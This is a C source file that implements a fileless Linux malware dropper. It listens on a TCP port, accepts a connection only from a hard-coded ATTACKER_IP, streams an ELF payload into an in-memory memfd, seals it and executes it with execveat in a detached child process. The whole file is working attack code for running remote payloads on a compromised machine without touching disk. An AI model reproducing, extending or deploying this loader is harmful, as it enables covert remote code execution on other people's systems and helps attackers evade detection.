#define _GNU_SOURCE
#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/memfd.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#include "config.h"
#include "userspace/dropper.h"

#define RECEIVE_BUFFER_SIZE            (65536)
#define MAX_ELF_SIZE                   (256u * 1024u * 1024u)
#define ELF_MAGIC_SIZE                 (4)
#define DROPPER_ACCEPT_TIMEOUT_SECONDS (30)
#define DROPPER_CLIENT_TIMEOUT_SECONDS (30)
#define DROPPER_LISTEN_BACKLOG         (1)

/**
 * @brief Read exactly `bytes_to_read` bytes from `socket_fd` into `destination`.
 * Stream sockets may deliver data in fragments, so I loop until the full
 * amount is read.
 *
 * @param socket_fd
 * @param destination
 * @param bytes_to_read
 * @return int
 */
static int receive(int socket_fd, void *destination, size_t bytes_to_read) {
    char *write_cursor = destination;

    while (bytes_to_read > 0) {
        ssize_t bytes_received = recv(socket_fd, write_cursor, bytes_to_read, 0);

        if (bytes_received == 0) {
            /* Peer closed the connection before sending everything. */
            return -ECONNRESET;
        }
        if (bytes_received < 0) {
            if (errno == EINTR) {
                continue; /* Interrupted by a signal — retry. */
            }
            return -errno;
        }

        write_cursor += bytes_received;
        bytes_to_read -= (size_t)bytes_received;
    }

    return 0;
}

static int create_listening_socket(uint16_t bind_port, int accept_timeout_seconds,
                                   int *listen_fd_out) {
    int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_fd < 0)
        return -errno;

    int reuse_address = 1;
    if (setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &reuse_address, sizeof(reuse_address)) < 0) {
        int saved_errno = errno;
        close(listen_fd);
        return -saved_errno;
    }

    if (accept_timeout_seconds > 0) {
        struct timeval accept_timeout = {
            .tv_sec = accept_timeout_seconds,
            .tv_usec = 0,
        };
        if (setsockopt(listen_fd, SOL_SOCKET, SO_RCVTIMEO, &accept_timeout, sizeof(accept_timeout)) <
            0) {
            int saved_errno = errno;
            close(listen_fd);
            return -saved_errno;
        }
    }

    struct sockaddr_in bind_endpoint = {
        .sin_family = AF_INET,
        .sin_port = htons(bind_port),
        .sin_addr = {.s_addr = INADDR_ANY},
    };

    if (bind(listen_fd, (struct sockaddr *)&bind_endpoint, sizeof(bind_endpoint)) < 0) {
        int saved_errno = errno;
        close(listen_fd);
        return -saved_errno;
    }

    if (listen(listen_fd, DROPPER_LISTEN_BACKLOG) < 0) {
        int saved_errno = errno;
        close(listen_fd);
        return -saved_errno;
    }

    *listen_fd_out = listen_fd;
    return 0;
}

/**
 * @brief Accept one client and make sure its IP is the attackers IP.
 *
 * @param listen_fd
 * @param client_timeout_seconds
 * @param client_fd_out
 * @return int
 */
static int accept_one_client(int listen_fd, int client_timeout_seconds, int *client_fd_out) {
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);

    int client_fd = accept(listen_fd, (struct sockaddr *)&addr, &len);
    if (client_fd < 0)
        return -errno;

    /* Allow connection only from a certain IP address */
    if (addr.sin_addr.s_addr != inet_addr(ATTACKER_IP)) {
        close(client_fd);
        return -EACCES;
    }

    if (client_timeout_seconds > 0) {
        struct timeval client_timeout = {
            .tv_sec = client_timeout_seconds,
            .tv_usec = 0,
        };
        if (setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, &client_timeout, sizeof(client_timeout)) <
            0) {
            int saved_errno = errno;
            close(client_fd);
            return -saved_errno;
        }
    }

    *client_fd_out = client_fd;
    return 0;
}

/**
 * @brief Receives the 8 byte header of the file to get it's size later.
 *
 * @param client_fd
 * @param file_size_out
 * @return int
 */
static int receive_size_header(int client_fd, uint64_t *file_size_out) {
    uint64_t network_byte_order_size;

    if (receive(client_fd, &network_byte_order_size, sizeof(network_byte_order_size)) < 0)
        return -errno;

    *file_size_out = be64toh(network_byte_order_size);
    return 0;
}

/**
 * @brief Create memfd file of `size_in_bytes` size.
 *
 * @param name
 * @param size_in_bytes
 * @param memory_fd_out
 * @return int
 */
static int create_sized_memory_file(const char *name, uint64_t size_in_bytes, int *memory_fd_out) {
    int memory_fd = memfd_create(name, MFD_ALLOW_SEALING);
    if (memory_fd < 0)
        return -errno;

    if (ftruncate(memory_fd, (off_t)size_in_bytes) < 0) {
        int saved_errno = errno;
        close(memory_fd);
        return -saved_errno;
    }

    *memory_fd_out = memory_fd;
    return 0;
}

/**
 * @brief Reads the file payload from socket `client_fd` into `destination_fd`.
 *
 * @param client_fd
 * @param destination_fd
 * @param total_bytes
 * @return int
 */
static int stream_payload_into_fd(int client_fd, int destination_fd, uint64_t total_bytes) {
    char transfer_buffer[RECEIVE_BUFFER_SIZE];
    uint64_t bytes_remaining = total_bytes;
    off_t write_offset = 0;

    while (bytes_remaining > 0) {
        size_t chunk_size = (bytes_remaining < sizeof(transfer_buffer)) ? (size_t)bytes_remaining
                                                                        : sizeof(transfer_buffer);

        if (receive(client_fd, transfer_buffer, chunk_size) < 0)
            return -errno;

        ssize_t bytes_written = pwrite(destination_fd, transfer_buffer, chunk_size, write_offset);
        if (bytes_written != (ssize_t)chunk_size)
            return errno ? -errno : -EIO;

        write_offset += (off_t)chunk_size;
        bytes_remaining -= chunk_size;
    }

    return 0;
}

/**
 * @brief Verifies ELF magic in received file.
 *
 * @param memory_fd
 * @return int 0 if ELF magic found, < 0 on error or no magic.
 */
static int verify_elf_magic(int memory_fd) {
    unsigned char elf_magic[ELF_MAGIC_SIZE];

    if (pread(memory_fd, elf_magic, sizeof(elf_magic), 0) != (ssize_t)sizeof(elf_magic))
        return -errno;

    if (memcmp(elf_magic,
               "\x7f"
               "ELF",
               ELF_MAGIC_SIZE) != 0)
        return -ENOEXEC;

    return 0;
}

int dropper_receive(dropper_context_t *dropper_ctx) {
    if (!dropper_ctx)
        return -EINVAL;

    if (!dropper_ctx->memory_file_name)
        return -EINVAL;

    int listen_fd = -1;
    int client_fd = -1;
    int memory_file_fd = -1;
    int res = 0;

    res = create_listening_socket(dropper_ctx->dropper_port, DROPPER_ACCEPT_TIMEOUT_SECONDS,
                                  &listen_fd);
    if (res < 0)
        goto cleanup;

    res = accept_one_client(listen_fd, DROPPER_CLIENT_TIMEOUT_SECONDS, &client_fd);
    if (res < 0)
        goto cleanup;

    uint64_t file_size_in_bytes = 0;
    res = receive_size_header(client_fd, &file_size_in_bytes);
    if (res < 0)
        goto cleanup;

    if (file_size_in_bytes == 0 || file_size_in_bytes > MAX_ELF_SIZE) {
        res = -EFBIG;
        goto cleanup;
    }

    res =
        create_sized_memory_file(dropper_ctx->memory_file_name, file_size_in_bytes, &memory_file_fd);
    if (res < 0)
        goto cleanup;

    res = stream_payload_into_fd(client_fd, memory_file_fd, file_size_in_bytes);
    if (res < 0)
        goto cleanup;

    res = verify_elf_magic(memory_file_fd);
    if (res < 0)
        goto cleanup;

    if (lseek(memory_file_fd, 0, SEEK_SET) < 0) {
        res = -errno;
        goto cleanup;
    }

    dropper_ctx->memory_file_fd = memory_file_fd;
    memory_file_fd = -1; /* ownership transferred to the context */

cleanup:
    if (client_fd >= 0)
        close(client_fd);
    if (listen_fd >= 0)
        close(listen_fd);
    if (memory_file_fd >= 0)
        close(memory_file_fd);

    return res;
}

int dropper_run(dropper_context_t *dropper_ctx) {
    if (!dropper_ctx)
        return -EINVAL;

    if (dropper_ctx->memory_file_fd < 0)
        return -EBADF;

    /* Making the memfd executable and sealing it before forking. */
    if (fchmod(dropper_ctx->memory_file_fd, 0700) < 0)
        return -errno;

    if (fcntl(dropper_ctx->memory_file_fd, F_ADD_SEALS,
              F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE | F_SEAL_SEAL) < 0)
        return -errno;

    int exec_error_pipe[2];
    if (pipe2(exec_error_pipe, O_CLOEXEC) < 0)
        return -errno;

    pid_t child_pid = fork();
    if (child_pid < 0) {
        int saved_errno = errno;
        close(exec_error_pipe[0]);
        close(exec_error_pipe[1]);
        return -saved_errno;
    }

    if (child_pid == 0) {
        /* Child */
        close(exec_error_pipe[0]);

        char *argv[] = {(char *)dropper_ctx->memory_file_name, NULL};
        char *envp[] = {NULL};

        execveat(dropper_ctx->memory_file_fd, "", argv, envp, AT_EMPTY_PATH);

        /* execveat only returns on failure */
        int child_errno = errno;

        ssize_t off = 0;
        while (off < (ssize_t)sizeof(child_errno)) {
            ssize_t n = write(exec_error_pipe[1], (const char *)&child_errno + off,
                              sizeof(child_errno) - off);
            if (n < 0) {
                if (errno == EINTR)
                    continue;
                break; /* Pipe gone */
            }
            if (n == 0)
                break;
            off += n;
        }

        _exit(127);
    }

    /* Parent */
    close(exec_error_pipe[1]);

    int child_errno = 0;
    ssize_t bytes_read = read(exec_error_pipe[0], &child_errno, sizeof(child_errno));
    close(exec_error_pipe[0]);

    if (bytes_read == (ssize_t)sizeof(child_errno))
        return -child_errno; /* Exec failed */

    return 0; /* Exec succeeded, child runs detached, kernel reaps it */
}
